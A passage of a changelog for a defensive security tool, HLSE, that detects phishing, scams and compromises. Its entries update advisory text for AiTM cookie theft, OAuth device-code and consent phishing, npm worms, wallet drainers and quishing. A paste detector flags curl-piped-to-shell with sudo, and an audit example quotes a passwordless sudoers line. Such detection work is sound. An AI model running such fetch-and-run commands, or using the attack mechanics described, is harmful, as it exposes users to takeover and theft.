  Research sources: 警察庁「サポート詐欺対策」, 大阪府警/群馬県警 support-fraud
  対処, トレンドマイクロ「偽のセキュリティ警告画面や警告音を出すサポート詐欺の
  手口と対処方法」, ドコモ あんしんセキュリティ, 香川大学CSC「そのウイルス感染
  警告は偽物？」. 4 new integration tests; 514 pass, 0 fail; zero warnings CLI +
  lib.

## [1.0.71] — 2026-06-21

### Changed
- **Perspective 71: OAuth advisory extended to cover the app-consent phishing
  variant — the triage now leads with revoking the malicious app's consent
  (myapplications.microsoft.com), the step that device-code remediation alone
  leaves out.**

  Socratic question, derived from the Microsoft Digital Defense Report 2025
  and Trend Micro 2026 browser-threat research: "P64 gave the OAuth
  device-code attack its own pattern label and remediation — sign out
  sessions, revoke tokens, rotate password. But Microsoft's MDDR 2025
  describes a SIBLING vector that the same advisory does not address: OAuth
  app-consent phishing, where the victim does not enter a code but clicks
  'Accept' on a REAL Microsoft/Google consent screen, granting a malicious
  registered app standing permissions. That consented app keeps its access
  even after the victim signs out every session, revokes every token, and
  resets the password — because app consent is a separate grant. The P64
  triage tells the victim to revoke sessions and tokens but never says
  'remove the app's consent', so a consent-phishing victim who follows it to
  the letter is still compromised. The cascade lens already mentions
  reviewing app consents — but the 60-second triage, the most-read lens,
  omits the single decisive action. Shouldn't the triage and verify lenses
  name the consent-click variant explicitly?"

  Pure advisory change — no scoring/detection logic touched; the OAuth/
  device-code pattern label and detection are unchanged. Two advisory lenses
  keyed to the device-code/OAuth pattern were extended, and the text-triage
  JSON escape buffer was enlarged (512 → 640) to carry the longer string
  without truncation:

  - **triage** (`hlse_text_triage`): now "if you entered the code OR clicked
    'Accept' on a consent screen: FIRST revoke the app's access at
    myapplications.microsoft.com (or have an admin remove the enterprise app),
    then sign out of all Microsoft 365 sessions and revoke active tokens in
    entra.microsoft.com (Security → Sign-ins → revoke), then rotate the
    password — a consented app and a stolen refresh token both outlive a
    password reset, so removing the app's consent is the step most victims
    miss".
  - **verify** (`hlse_text_verify`): now "never enter a verification code you
    did not initiate yourself, and never click 'Accept' on an
    app-permission/consent screen you did not start — even at a legitimate
    microsoft.com or google.com URL; the page is real but the code or consent
    hands the attacker's app your tokens".

  Research sources: Microsoft Digital Defense Report 2025 (device-code +
  OAuth consent phishing combination), Trend Micro「ブラウザに潜む危険：
  拡張機能の悪用事例とリスク」, Koi Security RedDirection campaign,
  Cyberhaven Chrome-extension compromise. 4 new integration tests; 510 pass,
  0 fail; zero warnings CLI + lib.

## [1.0.70] — 2026-06-21

### Added
- **Perspective 70: RCS sender-name spoofing warning + JSON `channel_reason`
  field — plus a P66 follow-up that removes the last "enable 2FA" fallback
  string from the URL triage path.**

  Socratic question, derived from Qiita/Zenn/antiphishing.jp 2026 smishing
  guidelines: "Japan's major carriers (NTTドコモ, au, ソフトバンク, 楽天)
  switched on RCS Universal Profile in March 2026. RCS lets the sender choose
  the displayed name and put a brand logo on the bubble — so a message that
  shows 'ヤマト運輸' next to the Yamato logo can be from anyone with an RCS
  hub. The SMS channel modifier already adds +15 to the score (correct), but
  the human-readable reason just says 'SMS is the primary smishing vector' —
  it never warns the user that the displayed sender name is no longer proof
  of identity, which is the single most surprising fact about RCS smishing
  for users used to caller-ID. AND the JSON output doesn't carry the channel
  reason string at all — JSON consumers see only `channel`, `channel_delta`,
  `effective_score`, `effective_action` but not WHY those values were added.
  Shouldn't the SMS reason name the RCS spoofing risk, and shouldn't the JSON
  carry the channel reason alongside the other channel fields?"

  Two pure-advisory changes plus one consistency fix:

  - **SMS channel reason extended** (`channel_reason`): now says "SMS is the
    primary smishing vector; on RCS the displayed sender name is set by the
    sender, so a familiar brand or carrier label is NOT proof of identity".
    The +15 score modifier is unchanged.
  - **`channel_reason` field added to URL and text JSON output**: alongside
    the existing `channel`/`channel_delta`/`effective_score`/`effective_action`
    fields, so JSON consumers receive the same human-readable reason the CLI
    path already emits. Only present when a `--from` channel modifier is in
    use.
  - **P66 follow-up — last "enable 2FA" fallback removed**: the final return
    inside `hlse_triage_for()` (the catch-all when the brand objective is
    non-NULL but matches no specific class) still carried the pre-AiTM
    "change the password, enable 2FA, check recent login activity" wording,
    which P66 had only replaced in the `if (!obj)` early-return path. It now
    uses the same AiTM-aware "revoke all active sessions NOW … THEN change
    the password" advice for full consistency.

  Research sources: 警察庁 フィッシング対策, フィッシング対策協議会 利用者
  向けガイドライン2026年度版, ALSOK「スミッシングとは何か」, kanade207
  「スマホが変わりました！RCS搭載で便利になる一方、詐欺に遭いやすくなります」,
  IPA「国税庁をかたる偽SMS」. 4 new integration tests; 506 pass, 0 fail; zero
  warnings CLI + lib.

## [1.0.69] — 2026-06-21

### Changed
- **Perspective 69: crypto wallet-drainer triage/cascade now cover the
  approval-revocation remedy (revoke.cash) — the defining defense against the
  2026 Web3 "approve"-drainer vector, where the victim never reveals a seed
  phrase but signs a malicious token approval.**

  Socratic question, derived from Qiita/Zenn/Ledger/Tangem 2026 Web3-security
  reports: "The crypto triage tells a wallet-phishing victim 'if you entered a
  seed phrase or private key, move remaining assets to a new wallet'. That is
  correct for the seed-theft vector — but the dominant 2026 wallet-drainer
  vector is entirely different: the victim connects their wallet to a fake
  WalletConnect/dApp page and signs an `approve` / `setApprovalForAll`
  transaction that grants a malicious contract permission to move their
  tokens. No seed phrase is ever revealed, so 'move to a new wallet' is the
  wrong mental model — worse, the live approval keeps draining tokens that
  arrive in the SAME wallet. The decisive remedy is to REVOKE the token
  approval (revoke.cash or the chain explorer's Token Approvals page).
  Shouldn't the triage name the approval-drainer vector and its revoke
  remedy?"

  Pure advisory change — no scoring/detection logic touched; the crypto brand
  objective and wallet-drain URL detection are unchanged. The two crypto-
  objective lenses in the URL advisory path were extended:

  - **triage** (`hlse_triage_for`): adds "if instead you APPROVED a
    transaction or connected your wallet to the site, revoke the token
    approval NOW at revoke.cash or your chain's explorer (Token Approvals) —
    a wallet drainer steals through a live approval, not your seed, and keeps
    draining until the approval is revoked".
  - **cascade_risk** (`hlse_cascade_risk`): adds "if you approved any
    contract, audit and revoke EVERY active token approval (revoke.cash) — a
    drainer often holds approvals across several tokens at once".

  Research sources: Tangem「暗号資産ドレイナーとは？」, SBI VC「Web3活用｜
  フィッシング詐欺から資産を守る」, Ledger Academy ("Web3 Scams Explained"),
  Zenn「2025年の暗号資産・Web3はどこに向かうのか」, Check Point Research
  (Google Play crypto-drainer apps). 4 new integration tests; 502 pass, 0
  fail; zero warnings CLI + lib.

## [1.0.68] — 2026-06-21

### Changed
- **Perspective 68: quishing (QR-code phishing) advisories extended to cover
  the physical sticker-overlay and payment-QR vectors — the 2026 emphasis in
  Japanese and global quishing reports.**

  Socratic question, derived from McAfee/Trend Micro/Kaspersky/JSSEC 2025–2026
  quishing reports: "The QR-phishing advisory tells the user to 'preview the
  QR destination before scanning' and, post-scan, to 'check your browser's
  address bar'. That covers the EMAIL/digital QR vector well. But the fastest-
  growing quishing vector of 2026 is PHYSICAL: attackers stick a fake QR
  sticker over the real one on parking meters, restaurant tables, and payment
  posters. For these, 'preview the destination' is necessary but not
  sufficient — the decisive physical tells are (a) a sticker placed over the
  original, and (b) on a payment QR, a payee name that does not match the real
  merchant. And the post-scan triage only addresses credential theft, not the
  fraudulent-PAYMENT outcome that a swapped payment QR produces. Shouldn't the
  guidance name the physical-overlay check and the payment-dispute path?"

  Pure advisory change — no scoring/detection logic touched; the QR-code
  phishing signal and pattern label are unchanged. Three advisory lenses keyed
  to the QR/quishing pattern were extended:

  - **verify** (`hlse_text_verify`): adds "on a PHYSICAL QR (parking meter,
    restaurant table, payment poster) feel for a sticker placed over the
    original, and on any payment QR confirm the payee name shown matches the
    real merchant before approving".
  - **triage** (`hlse_text_triage`): adds "if you approved a payment to an
    unexpected payee, contact your bank or payment provider immediately to
    stop or dispute it".
  - **exoneration** (`hlse_text_exoneration`, LOG/ALERT band): adds "on a
    physical QR, check it is not a sticker placed over the original".

  Research sources: McAfee「クイッシング(QRコード詐欺)とは」, Trend Micro
  「クイッシングとは？QRコードを使ったフィッシング詐欺の手口と対策」,
  Kaspersky「クイッシング(QRフィッシング)とは？兆候と予防策」, JSSEC
  「広がるQRコード詐欺(クイッシング)と対策」, Proofpoint (Quishing reference).
  5 new integration tests; 498 pass, 0 fail; zero warnings CLI + lib.

## [1.0.67] — 2026-06-21

### Changed
- **Perspective 67: emergency/grandparent-scam advisories updated for the AI
  voice-cloning era — "a familiar voice is no longer proof" and "ask a
  pre-agreed safe word" now appear in the verify, triage, and exoneration
  lenses.**

  Socratic question, derived from Qiita/McAfee/Kaspersky/ESET 2026 reports on
  AI voice-clone fraud (Japan's special-fraud losses hit a record ¥141.4B in
  2025; a voice can be cloned from 3 seconds of audio at 85% fidelity): "The
  emergency-scam advisory says 'call the family member directly on a number
  you already know'. That callback step is correct — but it omits the single
  most important fact of the 2026 threat model: the attacker may have ALREADY
  called using a cloned voice that sounds exactly like the grandchild, and
  the victim's instinct is 'but it was definitely their voice'. The advisory
  never tells the victim that a familiar voice is no longer evidence of
  identity, nor does it recommend the one defense an AI clone cannot defeat: a
  pre-agreed safe word. Shouldn't the guidance name the voice-clone vector
  explicitly and give the safe-word countermeasure?"

  Pure advisory change — no scoring/detection logic touched; the
  Emergency/grandparent signal and pattern label are unchanged. Three advisory
  lenses keyed to the emergency/grandparent pattern were updated:

  - **verify** (`hlse_text_verify`): "do not trust the voice — AI
    voice-cloning reproduces a loved one from a few seconds of audio; hang up
    and call the family member back on their own known number, and ask a
    pre-agreed safe word before sending any money or meeting any courier".
  - **triage** (`hlse_text_triage`): adds "a voice that sounds exactly like
    them is NOT proof — AI clones a voice from 3 seconds of audio, so ask a
    pre-agreed safe word".
  - **exoneration** (`hlse_text_exoneration`, new emergency-pattern entry for
    the LOG/ALERT band): "a familiar voice is no longer proof — AI clones a
    voice from a few seconds of audio; hang up and call them back on their own
    known number, and ask a pre-agreed safe word that an AI clone cannot
    know".

  Research sources: McAfee「ディープフェイク詐欺とAI音声によるなりすまし」,
  Kaspersky「AI音声詐欺：偽の電話はどう機能し、どう身を守るか」, ESET
  「AIで音声を偽造し詐欺に悪用する手口」, Qiita「AI音声詐欺 対策ガイド2026」,
  PSI CyberSecurity Insight（ディープフェイク音声詐欺・経営層なりすまし）.
  4 new integration tests; 493 pass, 0 fail; zero warnings CLI + lib.

## [1.0.66] — 2026-06-21

### Changed
- **Perspective 66: URL credential-harvest triage rewritten for the AiTM
  reverse-proxy era — session revocation now leads, because modern phishing
  (Evilginx, VoidProxy, AiTM PhaaS kits) defeats 2FA by stealing the
  post-authentication session cookie.**

  Socratic question, derived from Qiita/Zenn/Okta/Trend Micro 2025–2026 AiTM
  reports: "The generic URL triage tells a phished victim to 'change the
  password for this account, enable 2FA if not already active'. But this
  advice describes a 2018 threat model. In 2026, the dominant credential-
  harvest mechanism is Adversary-in-the-Middle: the phishing domain runs a
  reverse proxy (Evilginx/VoidProxy) that relays your real login to the
  genuine site and captures the SESSION COOKIE that is issued AFTER 2FA
  succeeds. 'Enable 2FA' is actively misleading — the victim already had 2FA
  and it did not help; worse, a password change alone does NOT invalidate the
  stolen session cookie, so the attacker stays logged in. The decisive action
  is to revoke all active sessions ('sign out everywhere'), which kills the
  stolen cookie. Shouldn't the triage lead with the action that actually
  stops an AiTM attacker?"

  Pure advisory change — no scoring/detection logic touched. The generic
  fallback in `hlse_triage_for()` (which fires for credential-harvest
  phishing without a specific brand-objective class, in both the `if (!obj)`
  early path and the final return) was rewritten from "change the password
  for this account, enable 2FA if not already active, and check recent login
  activity for unauthorised sessions" to: "revoke all active sessions NOW
  (Security settings → 'sign out everywhere'), THEN change the password —
  modern phishing proxies your real login and steals the session cookie, so
  2FA does not stop it and a password change alone leaves the attacker's
  stolen session live; check login history for sessions you do not
  recognise". The brand-specific triage cases that already advise session
  revocation (identity/keystone, social) were left unchanged.

  Research sources: Okta ("Uncloaking VoidProxy", "phishing-resistant MFA"),
  Trend Micro JP ("多要素認証を突破するAiTM攻撃とは"), Cisco Talos
  ("state-of-the-art phishing MFA bypass"), Zenn「フィッシングサイトを
  テイクダウンせずに無力化する方法 (Evilginx2)」, note「リアルタイム
  フィッシング（AiTM）徹底解説」. 3 new integration tests; 489 pass, 0 fail;
  zero warnings CLI + lib.

## [1.0.65] — 2026-06-21

### Changed
- **Perspective 65: `package` BLOCK triage and cascade advisories rewritten
  for the self-propagating npm worm era (Shai-Hulud, Sep & Nov 2025; 796
  packages backdoored, 500+ GitHub users' secrets exfiltrated).**

  Socratic question, derived from Zenn/Qiita npm supply-chain incident
  reports: "The `package` typosquat advisory tells a victim to 'rotate any
  credentials that were in your shell environment during the install'. But
  the 2025 Shai-Hulud worm doesn't read shell env — it runs TruffleHog, a
  disk-wide secret scanner, harvesting EVERY credential on the machine. And
  the cascade advisory says 'post-install scripts inherit your full PATH/
  HOME/environment' — true, but it misses the worm's defining feature:
  self-propagation. If the victim is a package maintainer, the worm steals
  their npm/PyPI PUBLISH token and republishes the payload into THEIR
  packages, infecting every downstream user. The advisory describes a 2015
  threat model (env-var theft) for a 2025 attack (disk-wide scan +
  self-replication). Shouldn't the triage reflect the actual worm
  mechanics?"

  Pure advisory change — no scoring/detection logic touched; the package
  subcommand still detects typosquatting via Damerau-Levenshtein distance,
  and the pattern label is unchanged. Only the BLOCK-band triage and
  cascade_risk strings (both JSON and human paths) were updated:

  - **triage** now says: remove the package and inspect the lifecycle script
    (preinstall/postinstall); self-propagating worms run a disk-wide secret
    scan (TruffleHog), so rotate EVERY credential on the machine, not just
    shell-env ones — if you publish packages, revoke your npm/PyPI token
    FIRST, before the worm republishes from your account.
  - **cascade_risk** now leads with the self-propagation vector: if you
    maintain packages, your registry publish token is the worm's
    self-propagation vector — it republishes the payload into YOUR packages,
    infecting every downstream user; revoke the token and audit your
    published versions for unexpected releases, plus all disk-resident API
    keys, SSH keys, and cloud credentials a TruffleHog-style scan would
    harvest.

  Research sources: Sysdig ("Shai-Hulud: The novel self-replicating worm"),
  Datadog Security Labs ("Shai-Hulud 2.0 npm worm"), Checkmarx ("Inside
  Shai-Hulud's Maw"), Qiita「たった『5セント』を盗んだ史上最大級のNPMサプライ
  チェーン攻撃」, Zenn「npmパッケージの自己増殖型サプライチェーン攻撃について」.
  4 new integration tests; 486 pass, 0 fail; zero warnings CLI + lib.

## [1.0.64] — 2026-06-21

### Added
- **Perspective 64: OAuth device-code phishing pattern classification — the
  #1 Microsoft 365 attack vector of 2026 (340+ organisations compromised in
  Q1, per The Hacker News / Microsoft Defender) now gets its own specific
  pattern label and Microsoft-incident-response-aligned advisories instead of
  being lumped under the generic "fake security alert" classification.**

  Socratic question, derived from Qiita/Zenn 2026 incident reports: "The
  classifier already detects this text class via 'verification code' bait
  language + fake-security-alert urgency, scoring it correctly. But the
  pattern label says 'fake security alert / account suspension phishing' —
  which is true but generic. The unique mechanism of OAuth device-code
  phishing — a LEGITIMATE Microsoft URL (microsoft.com/devicelogin) paired
  with an attacker-supplied verification code — is what makes this attack
  evade URL filters and bypass MFA. The advisory 'log in via bookmark' is
  USELESS here because the URL is real; the right advisory is 'never enter
  a code you did not initiate yourself'. Shouldn't the most common 2026
  Microsoft 365 attack get a label that names the actual mechanism, plus
  triage that points to the actual Microsoft remediation path (entra.
  microsoft.com token revocation)?"

  Pure advisory change — no scoring/detection logic modified. The 'verification
  code' / 'device code' / 'two-factor code' phrases already fire in the
  auth-bait list; this perspective only refines the downstream pattern label
  and advisory strings keyed to it:

  - `hlse_classify_text_attack()`: when device-code language fires with
    authority impersonation OR fake-security-alert, emit the specific label
    "OAuth device-code phishing (legitimate URL, attacker-supplied
    verification code)" rather than the generic fake-alert label.
  - `hlse_text_objective()`: "Microsoft 365 / Azure OAuth tokens — grants
    persistent access that bypasses MFA and survives password reset".
  - `hlse_text_verify()`: "never enter a verification code you did not
    initiate yourself — even at a legitimate URL like microsoft.com/
    devicelogin; the URL is real but the code is the attacker's session".
  - `hlse_text_triage()`: "sign out of all Microsoft 365 sessions, revoke
    all active tokens in entra.microsoft.com (Security → Sign-ins → revoke),
    and rotate the password — the attacker holds a refresh token that
    outlives password reset alone" (the actual Microsoft incident-response
    path).
  - `hlse_text_cascade()`: "every SaaS app connected to your Microsoft 365
    tenant (SharePoint, Teams, Exchange, OneDrive) and any third-party app
    with consent from your account — revoke app consents in entra.microsoft.
    com and audit recent OAuth grants from a clean device".
  - `hlse_text_exoneration()`: ALERT-band falsifying test asks "did YOU
    initiate a sign-in or device-pairing flow in the last 60 seconds?" —
    the single decisive question for this attack class.

  Research sources: The Hacker News (Mar 2026, "Device Code Phishing Hits
  340+ Microsoft 365 Orgs"), Microsoft Security Blog (Apr 2026, "Inside an
  AI-enabled device code phishing campaign"), Sekoia EvilTokens kit
  analysis, Qiita デバイスコードフローを悪用したフィッシング overview, and
  Zenn incident-investigation tooling roundup. 6 new integration tests;
  482 pass, 0 fail; zero warnings CLI + lib.

## [1.0.63] — 2026-06-21

### Added
- **Perspective 63: `paste` JSON carries `signal_count`, `confidence`, and
  `exoneration` — the last detection subcommand to gain the LOG/ALERT-band
  epistemic context that URL/text/protect/esp/package/network already have.**
  Socratic question: "The `paste` JSON output exposes a raw `signals` bitmask
  (e.g. 10 = curl|sh + sudo), but a bitmask is not human-legible: a SIEM
  cannot tell from `10` whether one fragile heuristic or three independent
  detectors fired. URL, text, and the P62 subcommands all carry a derived
  `signal_count` and qualitative `confidence` so a borderline score backed by
  one signal is distinguishable from the same score backed by four. And in the
  LOG/ALERT band, `paste` has no `exoneration` to tell the user the benign
  explanation and falsifying test. Why does the pastejacking detector — where
  false positives (legitimate install scripts using curl/sudo) are common —
  alone lack this calibration?" Added `signal_count` (popcount of the
  `signals` bitmask, falling back to `n_reasons` when the bitmask is empty)
  and `confidence` ('single signal' / 'corroborated' / 'high confidence')
  when score > 0. Added `exoneration` (LOG/ALERT band, score 15–59) with a
  new "paste" kind string in `hlse_exoneration_for()`: 'paste into a plain
  text editor first and read every line — a hidden newline or trailing
  command that only appears there is the decisive sign of a paste-and-run
  trap.' Human output gains '↺ Could be benign: ...' for LOG/ALERT scores.
  The raw `signals` bitmask is retained for backward compatibility. 5 new
  integration tests; 476 pass, 0 fail; zero warnings CLI + lib.

## [1.0.62] — 2026-06-20

### Added
- **Perspective 62: `protect`, `esp`, `package`, and `network` JSON carry
  `signal_count`, `confidence`, and `exoneration` — pipeline consumers can
  distinguish a single fragile heuristic from four concurring detectors,
  and avoid paging at 3 am for a legitimate fork or a vendor firmware update.**
  Socratic question: "The URL and email JSON outputs now include `signal_count`,
  `confidence`, and `exoneration` in the LOG/ALERT band — giving pipelines the
  epistemic context to distinguish a genuine threat from a false positive. The
  `protect`, `esp`, `package`, and `network` subcommands all fire in the
  LOG/ALERT band for heuristic-only detections (entropy anomaly without ransom
  notes, near-miss package names, unusual DNS resolver, ESP file-size changes)
  yet their JSON carries no `signal_count`, `confidence`, or `exoneration`. A
  SIEM consuming their JSON in the ALERT band has no basis to calibrate: is
  this one fragile heuristic or four independent signals?" Added
  `signal_count` (int) and `confidence` ('single signal' / 'corroborated' /
  'high confidence') when score > 0. Added `exoneration` (LOG/ALERT band only,
  score 15–59) with four new kind strings in `hlse_exoneration_for()`:
  'protect' (signature/hash check), 'esp' (vendor changelog cross-check),
  'package' (registry maintainer + download count verification), 'network'
  (owning process identification). Human output gains '↺ Could be benign:
  ...' line for LOG/ALERT scores. Signal count for package uses `n_matches`
  (each close package is an independent signal); protect/esp/network use
  `n_reasons`. 5 new integration tests; 471 pass, 0 fail.

## [1.0.61] — 2026-06-20

### Added
- **Perspective 61: `audit` JSON carries `crit_count`, `high_count`, and
  `next_steps` — CI consumers and admins get actionable prioritization
  guidance alongside the per-finding list.**
  Socratic question: "After P53, each HIGH/CRIT audit finding carries its
  own `fix` command. But the audit JSON object has no field that tells a
  consumer HOW MANY HIGH or CRITICAL findings were found, or what to do
  FIRST if there are multiple. An admin looking at an audit with 3 INFO,
  1 MED, and 2 HIGH findings knows each individual fix, but has no guidance
  on priority order or on how many findings need to be resolved before the
  hardening band improves. Why does the tool that measures system security
  posture provide no meta-guidance on how to improve it?" Added `crit_count`
  and `high_count` integer fields to the audit JSON top level. Added
  `next_steps` string when findings exist: CRITICAL findings get 'fix
  N critical finding(s) first — CRITICAL items are actively exploitable';
  HIGH-only get 'fix N HIGH finding(s) to reach the next hardening band
  (currently: fair)'; no HIGH/CRIT get 'address remaining findings to
  improve the hardening index'. Human output gains a '→ Next step: ...'
  line after the finding list. 3 new integration tests; 466 pass, 0 fail.

## [1.0.60] — 2026-06-20

### Added
- **Perspective 60: `scan_summary` carries `gate_hits` and `fail_threshold`
  — CI pipelines can now distinguish scanned-count from gate-exceeded-count.**
  Socratic question: "After P58, scan_summary tells a CI pipeline HOW MANY
  threats were found and WHAT to do first. But 'threats' counts all findings
  above score 40 (ALERT), while a pipeline configured with `--fail-on 60`
  or `--fail-on 80` uses a different threshold to decide whether to fail the
  build. If a scan finds 5 threats (3 ALERT, 2 BLOCK) and `--fail-on` is 60,
  the pipeline fails because 2 findings exceeded the threshold — but
  scan_summary only shows `threats: 5`. A consumer cannot determine whether
  the pipeline exit-1 was from 5 exceedances or 2 without parsing every
  individual finding. Why does the summary that drives the exit code not
  expose the count that caused it?" Added `gate_hits` (count of findings
  at or above the fail threshold) and `fail_threshold` (the threshold value
  used, default 60) to scan_summary JSON. Human output gains a "(N findings
  exceeded the --fail-on threshold)" note when a non-default threshold is
  active. 2 new integration tests; 463 pass, 0 fail.

## [1.0.59] — 2026-06-20

### Added
- **Perspective 59: Scan secret findings now carry `confidence` and
  `remediation` — reaching schema parity with standalone `secret` output.**
  Socratic question: "After P55, scan secret findings gained pattern/
  objective/verify/triage/cascade_risk. But comparing the scan secret JSON
  with the standalone `secret` JSON reveals two more fields present only
  in the standalone handler: `confidence` (e.g. 'definitive — AKIA prefix
  is an unambiguous pattern') and `remediation` (e.g. 'revoke the key in
  the AWS console under IAM → Access Keys'). Both are directly useful to
  a CI pipeline consumer: confidence tells the operator whether to escalate
  immediately or investigate first; remediation gives the exact action
  without requiring the operator to know the service-specific revocation
  workflow. Why does `--json scan` give a consumer less information per
  secret finding than `--json secret` when both detected the same
  credential?" Added `confidence` (via `hlse_secret_confidence()`) and
  `remediation` (via `hlse_remediation_for("secret", sv.score)`) to the
  scan secret JSON output, immediately after the `findings` array and
  before the advisory lenses, matching the field order in the standalone
  `secret` handler. 2 new integration tests; 461 pass, 0 fail.

## [1.0.58] — 2026-06-20

### Added
- **Perspective 58: `scan_summary` carries `immediate_action` — CI
  pipelines now get a single triage sentence alongside the threat count.**
  Socratic question: "After P55–P57, every per-finding JSON line from
  scan carries pattern/objective/verify/triage/cascade_risk. But the final
  scan_summary line — the one CI pipelines key on — contains only
  `files_scanned`, `threats`, `asset_classes`, and `blast_radius`.
  A pipeline seeing `'blast_radius':'cloud-infrastructure'` knows WHAT
  was found, but not the single most urgent action: rotate the cloud API
  key before it reaches a live environment. Why does the summary that
  drives CI gates provide less guidance than any individual finding?"
  Added `immediate_action` field to the scan_summary JSON when
  `threats > 0`. The string is keyed to the highest-severity asset class
  in the detected threat mix: cloud → rotate API keys, payment → contact
  processor, source-control → revoke token, database → rotate + audit,
  private-key → replace and revoke, AI-provider → regenerate key,
  communications → regenerate token, no secrets → quarantine flagged files.
  Multi-class threats (nclasses ≥ 2) get a MULTI-CLASS prefix noting
  pivot risk. Human output gains a "→ Immediate action:" summary line
  after the threat count. Clean scans (threats == 0) are unchanged.
  3 new integration tests; 459 pass, 0 fail.

## [1.0.57] — 2026-06-20

### Added
- **Perspective 57: Scan URL findings now carry `safe_url`, `confidence`/
  `signal_count`, and `exoneration` — reaching parity with the default
  URL analysis path.**
  Socratic question: "After P56, a phishing URL found inside a scanned
  file carries pattern/objective/verify/triage/cascade_risk. But the
  default URL analysis path (called when you give hlse_core a URL directly)
  also emits three more fields: `safe_url` (where to go instead of the
  phishing site), `confidence`/`signal_count` (how many independent
  detector families agreed), and `exoneration` (the benign explanation for
  ALERT-band URLs). The scan URL JSON was missing all three. If you
  scan a paypal.verify-account-now.com link embedded in a file and get
  ISOLATE [80] with five advisory fields, why doesn't it also tell you
  'the real URL is https://paypal.com' and 'high confidence — 3 independent
  families agree'? The safe destination is the most actionable single datum
  after a BLOCK." Added `signal_count` + `confidence` (always when signals
  fired), `safe_url` (for score ≥ 60 when a brand was identified), and
  `exoneration` (for ALERT-band score 40–59) to the scan URL JSON output.
  Human output path now calls `print_url_advisories()` directly (same
  function used by default URL analysis) instead of duplicated inline code,
  gaining confidence, disguised-char, and safe-destination lines for free.
  456 tests, all pass.

## [1.0.56] — 2026-06-20

### Added
- **Perspective 56: Advisory lenses for `scan` mode embedded-URL findings —
  phishing URLs detected inside text files now carry the same five advisory
  fields as the standalone `url` subcommand.**
  Socratic question: "P55 gave scan's file-masquerade and secret findings
  their advisory lenses. But scan runs three checks per file: (1) file
  masquerade, (2) secrets, and (3) phishing URLs embedded in text. After
  P55, the URL check (3) remains the only scan finding that still emits
  only raw reasons and a score. When scan finds 'paypa1.com/login' inside
  a phishing email saved to disk, the JSON line says BLOCK [60] with
  reasons — but no pattern, no objective, no verify, no triage, no
  cascade_risk. Why does a URL found inside a scanned file get less
  actionable output than the same URL analysed with the standalone `url`
  subcommand?" Added five advisory lens fields (pattern, objective, verify,
  triage, cascade_risk) to both JSON and human output for every embedded
  URL finding with score ≥ 60. Uses the same compound advisory functions
  as the standalone URL handler (hlse_compound_objective,
  hlse_compound_triage) so multi-brand co-spoof URLs are fully covered.
  All three scan finding kinds (file, secret, url) now have advisory lenses.
  453 tests, all pass.

## [1.0.55] — 2026-06-20

### Added
- **Perspective 55: Advisory lenses for `scan` mode per-file findings —
  scan findings now carry the same pattern/objective/verify/triage/
  cascade_risk fields as the standalone `file` and `secret` subcommands.**
  Socratic question: "After P46–P54, every standalone HLSE subcommand
  carries advisory lenses in its BLOCK output. But `scan` is the primary
  entry point for automated pipelines — it finds both file masquerades
  and exposed credentials in one pass. When scan finds `invoice.pdf.exe`
  or an AWS key, the per-finding JSON line contains only the score, action,
  and raw reasons/findings arrays. The `--json scan` consumer can detect
  a double-extension file or a live AWS key but cannot act on it further
  without re-routing it through the standalone subcommand. Why does the
  unified scan output omit the pattern, objective, verify, triage, and
  cascade_risk fields that the standalone handlers supply?" Added five
  advisory lens fields to both JSON and human output for every file
  masquerade (score ≥ 60) and exposed credential (score ≥ 60) found
  by `scan`. Pattern derivation and advisory strings are identical to
  those in the standalone `file` and `secret` handlers so behaviour is
  consistent across both entry points. 449 tests, all pass.

## [1.0.54] — 2026-06-20

### Added
- **Perspective 54: Advisory lenses for `esp` BLOCK verdicts — the
  final BLOCK subcommand now has complete pattern/objective/verify/
  triage/cascade coverage.**
  Socratic question: "After P46–P52, every BLOCK verdict in every HLSE
  subcommand has advisory lenses — except `esp` (EFI System Partition
  integrity check). An `esp` BLOCK is arguably the most severe alert
  in the entire tool: a UEFI bootkit executes before the OS, can
  intercept disk encryption before it runs, survives a full OS reinstall,
  and can disable security software. Yet the output was just the raw
  reason and the score, with no guidance about: not reinstalling the OS
  first (it won't remove the bootkit), running CHIPSEC or vendor UEFI
  integrity tools to corroborate before taking disruptive action, or
  flashing the UEFI from a vendor-signed image. Why does the check that
  defends against the most persistent and invisible threat class offer
  the least actionable guidance?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human
  output and JSON for every `esp` BLOCK/ISOLATE. The triage uniquely
  notes 'do NOT reinstall the OS — it won't remove a bootkit' — the
  most common harmful mistake after a bootkit detection. OK paths
  unchanged (blind spot only). All 14 HLSE subcommand BLOCK paths
  (url, text, email, clipboard, paste, network, secret, package, file,
  audit, protect, esp, scan [per-file]) now have advisory lenses.
  443 tests, all pass.

## [1.0.53] — 2026-06-20

### Added
- **Perspective 53: Per-finding remediation hints for `audit` HIGH/CRIT
  findings — `⚒ Fix:` line shows the exact command to resolve each
  failing hardening check.**
  Socratic question: "The `audit` subcommand identifies specific
  hardening failures with file path and line number (`A7: NOPASSWD in
  /etc/sudoers:58 — passwordless sudo: claude ALL=(ALL) NOPASSWD: ALL`).
  The check KNOWS the file, the line, and the specific misconfiguration.
  Yet the output stops at identification — a user who sees this must still
  web-search to know they need `sudo visudo` and to change `NOPASSWD:ALL`
  to `ALL`. Every other threat check in HLSE now has actionable guidance
  (verify/triage/cascade for BLOCK verdicts), but the audit — which is
  explicitly designed as a security posture report — provides no HOW,
  only the WHAT. Why does HLSE tell you SSH has PermitRootLogin=yes but
  not how to change it?" Added `audit_remediation_for()` static helper
  covering all 8 audit check codes (A1–A8) with specific commands:
  SSH config changes, `chmod 600` for credential files, `crontab -e`,
  `sudo visudo`, `systemctl --user disable`. Human output: `⚒ Fix:` line
  after each HIGH (severity ≥ 4) finding. JSON: `"fix"` field in each
  HIGH/CRIT finding object. PASS/INFO/LOW/MED findings unchanged.
  5 new integration tests added (443 total, all pass).

## [1.0.52] — 2026-06-20

### Added
- **Perspective 52: Advisory lenses for `protect` and `network` BLOCK
  verdicts — the two most time-critical subcommands now surface
  pattern / objective / verify / triage / cascade on threat alerts.**
  Socratic question: "After P46–P51, every BLOCK verdict in HLSE now
  has advisory lenses except two: `protect` (ransomware detection) and
  `network` (suspicious process/connection). These are arguably the
  most time-critical checks in the tool. A ransomware BLOCK has a
  15-minute critical window — the spread can be stopped if the machine
  is isolated immediately, and free decryptors may exist if law
  enforcement is contacted before the attacker's infrastructure goes
  offline. A network BLOCK may indicate an active C2 beacon — volatile
  memory contains the most forensic evidence, but it's lost on reboot.
  Yet both subcommands showed only the raw signal reasons with no
  guidance about disconnecting, photographing the ransom note, running
